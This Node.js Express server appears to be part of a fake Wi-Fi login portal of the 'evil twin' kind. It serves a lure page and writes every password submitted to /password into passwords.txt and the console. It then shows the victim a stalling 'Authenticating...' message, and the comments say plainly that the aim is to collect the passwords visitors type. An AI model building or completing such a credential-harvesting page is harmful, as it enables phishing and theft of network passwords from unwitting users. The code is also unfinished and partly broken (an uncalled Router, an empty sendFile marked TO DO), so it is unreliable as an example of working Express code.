// The web server
const express = require('express')
const app = express()
const router = express.Router;
// The port the web server listen to
const port = 80
// Working with files
const fs = require('fs');
// The option to pull the password from the body of the POST request
const BodyParser = require('body-parser')
app.use(BodyParser.urlencoded({extended: true}))

//Import node-wifi 
//const wifi = require('node-wifi');
//https://www.npmjs.com/package/node-wifi



var title ='';


// What to do if there is a GET request
router.get('/', (req, res) => {
    // Print message to the server side
    console.log('The client tried to enter a website.');
    // Response - return the HTML page 
    res.sendFile('./Dw.html');
});

// What to do if there is a POST request

//app.post('/password', async (req, res) => {

app.post('/password', (req, res) => {
    // In POST request the information is in the body
    // The information in our case is the password that the client entered
    const password = req.body.password;
    // Write the given password in the 'password.txt' file & Print a message in the server side
    fs.appendFileSync('passwords.txt', `password : ${password} \n`);
    console.log(`The client enter another password : ${password} \nYou may also see this password in - passwords.txt`);
    
    // ans will be True - if the password is correct
    // ans will be False - if the password is incorrect
   // const ans = await checkPassword(password);
    // title will be the message for the client side, we will insert it to the new HTML page
    //title = ans ? 'Great succeess :)' : 'The password is incorrect. :(';
    
    title = "Authenticating...\n If you wait more than 1min. the password is INCORRECT."
    // Response - return the new HTML page 
    res.sendFile('');  //TO DO
});


// Define the port that the web server will listen to
app.use('/', router);
app.listen(port, () => {
    console.log(`WebServer is up. Listening at http://localhost:${port}`);
})
